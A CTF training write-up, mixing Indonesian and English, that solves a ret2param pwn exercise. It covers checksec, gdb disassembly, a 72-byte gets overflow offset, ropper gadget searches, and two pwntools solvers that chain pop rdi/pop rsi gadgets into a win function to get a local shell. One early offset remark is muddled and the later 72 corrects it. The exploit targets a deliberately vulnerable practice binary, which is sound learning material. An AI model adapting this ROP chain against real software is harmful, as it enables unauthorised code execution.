---
slug: "pwn-ret2param-2"
title: "ret2param"
competition: "Exercise"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2param."
tags: ["PWN","ROP","HANDS-ON","EASY","X64","RET2PARAM"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2param-2"
---

# ret2param

> Latihan buat persiapan seleksi LKS, isinya ret2param.

Diawal, kita sudah diberi hint bahwa challenge ini itu **ret2param**. Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main*
❯ checksec something_64                                                          󰥔 14:10:48
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param/something_64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Luckily, its not stripped, lets check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main*
❯ pwndbg something_64                                                            󰥔 14:10:50
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from something_64...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in something_64)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  system@plt
0x00000000004010b0  printf@plt
0x00000000004010c0  gets@plt
0x00000000004010d0  setvbuf@plt
0x00000000004010e0  exit@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  init
0x000000000040121d  win
0x000000000040127f  sport
0x00000000004012e0  main
0x0000000000401310  __libc_csu_init
0x0000000000401380  __libc_csu_fini
0x0000000000401388  _fini
```

Because this is a ret2param, so i have to check all the function that defined here. As usual, the main calling the other function.

```
gef➤  disas win
Dump of assembler code for function win:
   0x000000000040121d <+0>:     endbr64
   0x0000000000401221 <+4>:     push   rbp
   0x0000000000401222 <+5>:     mov    rbp,rsp
   0x0000000000401225 <+8>:     sub    rsp,0x10
   0x0000000000401229 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x000000000040122c <+15>:    mov    DWORD PTR [rbp-0x8],esi
   0x000000000040122f <+18>:    cmp    DWORD PTR [rbp-0x4],0xba5eba11
   0x0000000000401236 <+25>:    jne    0x401267 <win+74>
   0x0000000000401238 <+27>:    cmp    DWORD PTR [rbp-0x8],0xf007ba11
   0x000000000040123f <+34>:    jne    0x401267 <win+74>
   0x0000000000401241 <+36>:    lea    rdi,[rip+0xdc0]        # 0x402008
   0x0000000000401248 <+43>:    call   0x401090 <puts@plt>
   0x000000000040124d <+48>:    lea    rdi,[rip+0xdc6]        # 0x40201a
   0x0000000000401254 <+55>:    call   0x401090 <puts@plt>
   0x0000000000401259 <+60>:    lea    rdi,[rip+0xdc8]        # 0x402028
   0x0000000000401260 <+67>:    call   0x4010a0 <system@plt>
   0x0000000000401265 <+72>:    jmp    0x40127d <win+96>
   0x0000000000401267 <+74>:    lea    rdi,[rip+0xdc2]        # 0x402030
   0x000000000040126e <+81>:    call   0x401090 <puts@plt>
   0x0000000000401273 <+86>:    mov    edi,0x0
   0x0000000000401278 <+91>:    call   0x4010e0 <exit@plt>
   0x000000000040127d <+96>:    leave
   0x000000000040127e <+97>:    ret
End of assembler dump.
gef➤  disas sport
Dump of assembler code for function sport:
   0x000000000040127f <+0>:     endbr64
   0x0000000000401283 <+4>:     push   rbp
   0x0000000000401284 <+5>:     mov    rbp,rsp
   0x0000000000401287 <+8>:     sub    rsp,0x40
   0x000000000040128b <+12>:    lea    rdi,[rip+0xdd2]        # 0x402064
   0x0000000000401292 <+19>:    call   0x401090 <puts@plt>
   0x0000000000401297 <+24>:    lea    rdi,[rip+0xde2]        # 0x402080
   0x000000000040129e <+31>:    call   0x401090 <puts@plt>
   0x00000000004012a3 <+36>:    lea    rdi,[rip+0xe06]        # 0x4020b0
   0x00000000004012aa <+43>:    call   0x401090 <puts@plt>
   0x00000000004012af <+48>:    lea    rdi,[rip+0xe2a]        # 0x4020e0
   0x00000000004012b6 <+55>:    mov    eax,0x0
   0x00000000004012bb <+60>:    call   0x4010b0 <printf@plt>
   0x00000000004012c0 <+65>:    lea    rax,[rbp-0x40]
   0x00000000004012c4 <+69>:    mov    rdi,rax
   0x00000000004012c7 <+72>:    mov    eax,0x0
   0x00000000004012cc <+77>:    call   0x4010c0 <gets@plt>
   0x00000000004012d1 <+82>:    lea    rdi,[rip+0xe60]        # 0x402138
   0x00000000004012d8 <+89>:    call   0x401090 <puts@plt>
   0x00000000004012dd <+94>:    nop
   0x00000000004012de <+95>:    leave
   0x00000000004012df <+96>:    ret
End of assembler dump.
```

Okay, there’s gets. and 0x80 = 128, because its x86, we need 136 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x40
64
>>> 0x40 + 8
72
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x23
$rbx   : 0x0
$rcx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rdx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rsp   : 0x00007fffffffdfb8  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00007ffff7e4e603  →  0xe4f750000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x00000000004012df  →  <sport+0060> ret
$r8    : 0x1
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007fffffffe0e0  →  0x0000000000000001
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe3c0  →  0x0000000000000000
$r15   : 0x00007fffffffe0f8  →  0x00007fffffffe51a  →  "QT_QPA_PLATFORM=wayland"
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb8│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa"       ← $rsp
0x00007fffffffdfc0│+0x0008: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffdfc8│+0x0010: "laaaaaaamaaa"
0x00007fffffffdfd0│+0x0018: 0x00007f006161616d ("maaa"?)
0x00007fffffffdfd8│+0x0020: 0x00000000004012e0  →  <main+0000> endbr64
0x00007fffffffdfe0│+0x0028: 0x00000001f7fe1bf0
0x00007fffffffdfe8│+0x0030: 0x00007fffffffe0e8  →  0x00007fffffffe4b9  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0x00007fffffffdff0│+0x0038: 0x0000000000400040  →   (bad)
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012d8 <sport+0059>     call   0x401090 <puts@plt>
     0x4012dd <sport+005e>     nop
     0x4012de <sport+005f>     leave
 →   0x4012df <sport+0060>     ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "something_64", stopped 0x4012df in sport (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012df → sport()
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("something_64_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = "amd64"
gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    payload = flat(
        b'A' * 72,
        0x0000000000401373, #RDI
        0xba5eba11,
        0x0000000000401371, #RSI + R15 (r15nya ngikut aja dia kocak nih)
        0xf007ba11,
        0,
        0x000000000040121d #Win
    )
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Nah, aku ini no AI tapi melihat referensi dari google. Itu fitur ya katanya di JCC wkwk.

![](/assets/uploads/029e3b31-9cb5-404b-addd-dc6ba5f0290d-image-2.png)

Sebenarnya salahku itu awalnya karena setelah pop RDI itu aku langsung ngasih address win, baru nanti ngasih argsnya. Nah, ketika aku googling itu, ternyata aku salah. Dan akhirnya aku ngefix deh.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main*
❯ ropper --file something_64 --search "pop"                                      󰥔 14:14:13
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: something_64
0x000000000040136c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040136e: pop r13; pop r14; pop r15; ret;
0x0000000000401370: pop r14; pop r15; ret;
0x0000000000401372: pop r15; ret;
0x000000000040136b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040136f: pop rbp; pop r14; pop r15; ret;
0x00000000004011bd: pop rbp; ret;
0x0000000000401373: pop rdi; ret;
0x0000000000401371: pop rsi; pop r15; ret;
0x000000000040136d: pop rsp; pop r13; pop r14; pop r15; ret;
```

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./something_64')
p = process()

rdi = p64(0x401373)
ret = p64(0x40101a)
win = p64(0x40121d)
rsi = p64(0x401371)
offset = 72
param_1 = 0xba5eba11
param_2 = 0xf007ba11

payload = flat(
    'A' * offset,
    rdi, param_1,
    rsi, param_2, p64(0x0),
    win
)

p.sendline(payload)
p.interactive()⏎
```

we can keep it and use it as a reference in the future.

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main*
❯ python3 solve.py LOCAL                                                         󰥔 14:25:03
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param/something_64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[┤] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2param/something_64_patched': pid 132845
[*] Switching to interactive mode
Hana: Ayo olahragaa'
Luna: Tunggu kak, Luna mau nyiapin diri dahulu
Luna: Tapi Luna juga tidak tau olahrgara apa?
Hana: Udah tenang. Kan ada olahraga baseball dan football juga sih. Ayookk udh
>
Luna: Oke oke chill, Luna datang.

Hana: Ayo lunaaa
Luna: tungguu
$ ls
solve32.py    something_32_patched  something_64_patched
solve.py      something_32.py       something_64.py
something_32  something_64          something.zip
```
